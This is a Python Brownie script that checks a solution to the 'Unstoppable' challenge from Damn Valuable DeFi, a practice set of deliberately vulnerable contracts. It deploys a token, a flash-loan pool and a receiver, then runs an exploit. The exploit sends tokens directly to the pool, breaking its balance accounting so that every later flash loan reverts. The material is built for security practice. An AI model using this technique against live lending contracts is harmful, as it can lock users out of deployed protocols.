#!/usr/bin/python3

from brownie import  DamnValuableToken, UnstoppableLender, ReceiverUnstoppable, accounts

def main():
    UnstoppableChecker().main()

class UnstoppableChecker():


    """class to run pass/fail check on challenge exploit: unstoppable"""


    def __init__(self):
        self.deployer = accounts[0]
        self.attacker = accounts[1]
        self.some_user = accounts[2]
        self.other_accounts = accounts[3:]
        self.TOKENS_IN_POOL = self.ether(10**6)
        self.INITIAL_ATTACKER_BALANCE = self.ether(100)
        self.token = DamnValuableToken.deploy({'from': self.deployer})
        self.pool = UnstoppableLender.deploy(self.token.address, {'from': self.deployer})
        self.receiverContract = ReceiverUnstoppable.deploy(self.pool.address, {"from": self.some_user})

    def main(self):
        """runs setup, exploit and test_exploit, results are logged by respective classes"""
        self.setup()
        self.test_contract_pre_exploit()
        self.exploit()
        self.test_contract_post_exploit()

    def setup(self):
        """performs required deployments and token transfers prior to running the exploit"""
        self.token.approve(self.pool.address, self.TOKENS_IN_POOL + self.INITIAL_ATTACKER_BALANCE/2, {"from": self.deployer})
        self.pool.depositTokens(self.TOKENS_IN_POOL, {"from": self.deployer})
        self.token.transfer(self.attacker, self.INITIAL_ATTACKER_BALANCE, {"from": self.deployer})
        print(f"Setup Check 1 passed: {self.token.balanceOf(self.pool.address) == self.TOKENS_IN_POOL}")
        print(f"Setup Check 2 passed: {self.token.balanceOf(self.attacker) == self.INITIAL_ATTACKER_BALANCE}")

    def test_contract_pre_exploit(self):
        """tests contracts executeFlashLoan method pre-exploit"""
        print("PRE EXPLOIT TEST RUNNING...")
        self.receiverContract.executeFlashLoan(10, {"from": self.some_user})

    def exploit(self):
        """WRITE EXPLOIT HERE"""
        print("RUNNING EXPLOIT...")
        self.token.transfer(self.pool.address, self.INITIAL_ATTACKER_BALANCE, {"from": self.attacker })
        return

    def exploit_outcome(self):
        """returns True if exploit outcome is as expected"""
        return self.receiverContract.executeFlashLoan(10, {"from": self.some_user}).revert_msg == "Transaction reverted without a reason string"

    def test_contract_post_exploit(self):
        """tests contracts executeFlashLoan method post exploit"""
        print("POST EXPLOIT TEST RUNNING...")
        try:
            assert(self.exploit_outcome())
        except:
            print("Exploit did not pass: \u274E \n Expected a transaction revert")
            return
        print("Passed: \u2705")
    
    def ether(self, amount):
        """receives number and converts to wei"""
        return amount*10**18
